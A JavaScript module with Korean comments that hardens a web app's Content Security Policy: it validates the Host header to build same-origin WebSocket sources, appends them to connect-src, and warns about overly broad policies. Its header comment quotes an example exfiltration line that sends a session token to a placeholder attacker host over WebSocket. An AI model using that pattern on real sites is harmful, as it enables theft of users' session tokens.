/**
 * util/csp.js — 콘텐츠 보안 정책(CSP) 문자열 도우미(보안 잔여 11-27 L13 — 순수 함수 · 다른 모듈을 import 하지 않는다).
 *
 * 왜: 기본 정책의 `connect-src 'self' ws: wss:` 는 **모든 호스트의** ws/wss 를 열었다 — 주입된 스크립트가
 *   `new WebSocket('wss://attacker/?t=' + token)` 으로 localStorage 세션 토큰을 내보내도 CSP 가 막지 않았다.
 *   이제 기본 정책은 `connect-src 'self'` 이고, 같은 출처 WebSocket(원격 콘솔 SSH·RDP 게이트웨이)은 CSP3 의 `'self'` 가 포함한다
 *   (http 문서 → 같은 host:port 의 ws·wss, https 문서 → wss). 구형 WebKit 은 `'self'` 에 ws/wss 를 넣지 않았다(WebKit 201591 →
 *   235873 로 고쳐짐 — 실린 Safari 판은 확인하지 못했다). 그래서 index.js 는 **기본 정책일 때만** 요청 Host 헤더를 검증해 그 호스트의
 *   ws/wss 를 명시로 덧붙인다(`sameHostWsSources` → `withConnectSources`). 형식 밖이면 덧붙이지 않는다(좁은 쪽 — `'self'` 만 남는다).
 * ⚠ connect-src 에 스킴 전체(ws: · wss: · http: · https:)나 `*` 를 넣지 말 것.
 * ⚠ connect-src 가 막는 것은 fetch·XHR·WebSocket·EventSource 반출뿐이다 — 탐색(location.href · window.open) 반출은 CSP 로 막지 못한다.
 *   1차 방어는 `script-src 'self'`(주입된 스크립트가 돌지 않게)다.
 */

// DNS 라벨(소문자로 바꾼 뒤) — 짧은 조각(≤63자)에만 쓴다. 밑줄·별표·공백·따옴표·';'·','·CR/LF 는 전부 여기서 걸린다(지시자 주입 불가).
const LABEL_RE = /^[a-z0-9-]{1,63}$/;
const PORT_RE = /^\d{1,5}$/;
const HOST_MAX = 253;
const RAW_MAX = HOST_MAX + 1 + 5 + 2;   // 이름 + ':' + 포트 — 넘는 값은 형식을 보기 전에 버린다

/**
 * 요청 Host 헤더(원문)에서 같은 호스트의 WebSocket 소스를 만든다. 형식 밖이면 ''(덧붙이지 않는다).
 *   · secure(https 문서) → `wss://h[:p]` · 평문 → `ws://h[:p] wss://h[:p]`(TLS 를 앞단 프록시가 끝내고 X-Forwarded-Proto 를 주지 않으면
 *     서버는 평문으로 보지만 화면은 wss 로 붙는다 — 둘 다 같은 호스트라 넓어지지 않는다).
 *   · IPv6 리터럴(`[::1]:4000`)은 CSP host-source 문법에 없어 ''(최신 브라우저는 `'self'` 로 동작한다).
 *   · 검증은 split 으로 선형이다(정규식은 63자 이하 조각에만).
 * @param {unknown} rawHost  `req.headers.host`(원 Host 헤더 — X-Forwarded-Host 를 따르지 않는다)
 * @param {{ secure?: boolean }} [opts]
 * @returns {string}
 */
export function sameHostWsSources(rawHost, opts = {}) {
  if (typeof rawHost !== 'string' || !rawHost || rawHost.length > RAW_MAX) return '';
  const v = rawHost.toLowerCase();
  if (v.startsWith('[')) return '';
  const parts = v.split(':');
  if (parts.length > 2) return '';
  const host = parts[0];
  let port = '';
  if (parts.length === 2) {
    port = parts[1];
    if (!PORT_RE.test(port)) return '';
    const n = Number(port);
    if (n < 1 || n > 65535) return '';
  }
  if (!host || host.length > HOST_MAX) return '';
  for (const label of host.split('.')) {
    if (!LABEL_RE.test(label)) return '';
    if (label.startsWith('-') || label.endsWith('-')) return '';
  }
  const hp = port ? `${host}:${port}` : host;
  return opts?.secure === true ? `wss://${hp}` : `ws://${hp} wss://${hp}`;
}

/**
 * 정책의 `connect-src` 지시자 끝에 소스를 덧붙인다. extra 가 '' 이면 입력 그대로(같은 문자열).
 * connect-src 가 없거나 둘 이상이면 덧붙이지 않고 입력 그대로 돌려준다(어디에 붙일지 모르면 넓히지 않는다).
 * @param {string} policy
 * @param {string} extra
 * @returns {string}
 */
export function withConnectSources(policy, extra) {
  if (typeof policy !== 'string' || typeof extra !== 'string' || !extra) return policy;
  const parts = policy.split(';');
  let at = -1;
  for (let i = 0; i < parts.length; i += 1) {
    if (directiveName(parts[i]) === 'connect-src') {
      if (at >= 0) return policy;
      at = i;
    }
  }
  if (at < 0) return policy;
  const lead = parts[at].match(/^\s*/)[0];
  parts[at] = `${lead}${parts[at].trim()} ${extra}`;
  return parts.join(';');
}

function directiveName(d) {
  const t = String(d).trim();
  if (!t) return '';
  const sp = t.search(/\s/);
  return (sp < 0 ? t : t.slice(0, sp)).toLowerCase();
}

// 스킴 전체로 네트워크를 여는 소스 — 그 스킴의 모든 호스트로 연결할 수 있다.
const BROAD_SCHEMES = new Set(['http:', 'https:', 'ws:', 'wss:']);

/**
 * 환경변수 `CSP` 값에 대한 기동 경고(한국어 문구 배열). **정책은 바꾸지 않는다**(운영자의 명시적 결정 — 경고만).
 *   · `off` → 정책이 꺼져 있다.
 *   · 유효 연결 지시자(첫 connect-src, 없으면 첫 default-src — CSP3: 같은 지시자가 둘이면 첫 것만 유효)가 없다 → 연결 제한 없음.
 *   · 그 값에 `*` 를 담은 소스(`*` · `https://*` · `*.example.com`)나 스킴 전체(http: https: ws: wss:)가 있다 → 넓은 연결처.
 *   · 미설정·빈 값(기본 정책을 쓴다) · 좁은 정책 → [].
 * @param {unknown} envCsp  process.env.CSP
 * @returns {string[]}
 */
export function cspEnvNotes(envCsp) {
  if (envCsp == null || envCsp === '') return [];
  const raw = String(envCsp);
  if (raw === 'off') return ['[csp] CSP=off — 콘텐츠 보안 정책이 꺼져 있습니다(세션 토큰을 노린 스크립트 주입의 완화 수단이 없습니다).'];
  let connect = null; let def = null;
  for (const d of raw.split(';')) {
    const name = directiveName(d);
    if (name === 'connect-src' && connect == null) connect = d.trim();
    else if (name === 'default-src' && def == null) def = d.trim();
  }
  const eff = connect ?? def;
  const tail = '주입된 스크립트가 토큰을 외부로 보낼 수 있습니다. 기본 정책(CSP 미설정)은 같은 출처만 허용합니다(보안 잔여 11-27 L13).';
  if (eff == null) return [`[csp] CSP 환경변수 정책에 connect-src · default-src 가 없어 연결처 제한이 없습니다 — ${tail}`];
  const broad = eff.split(/\s+/).slice(1).filter((s) => s && (s.includes('*') || BROAD_SCHEMES.has(s.toLowerCase())));
  if (!broad.length) return [];
  const which = connect != null ? 'connect-src' : 'connect-src(없어서 default-src 를 따름)';
  const shown = broad.slice(0, 6).join(' ').slice(0, 200);
  return [`[csp] CSP 환경변수 정책의 ${which} 가 넓은 연결처(${shown})를 허용합니다 — ${tail}`];
}
